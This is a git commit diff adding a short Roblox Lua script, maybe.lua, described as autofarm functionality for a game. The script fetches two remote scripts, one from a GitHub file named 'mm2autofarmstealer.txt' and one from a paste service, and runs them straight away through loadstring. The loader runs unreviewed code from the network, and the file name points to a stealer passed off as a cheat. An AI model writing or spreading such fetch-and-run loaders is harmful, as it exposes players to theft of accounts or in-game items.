3470b85793c94639e8c290835bf6f8ab978bd2c7
Johnnyissocoollol <progackerroblox@gmail.com>
2026-06-30 11:39:13 -0500

    Add autofarm functionality in maybe.lua

---
+++ maybe.lua
@@ -0,0 +1,6 @@
+local function farm()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Johnnyissocoollol/Mm2New/refs/heads/main/mm2autofarmstealer.txt", true))()
+    loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/K5rpsNMOdk1HGD3G/raw", true))()
+end
+
+farm()
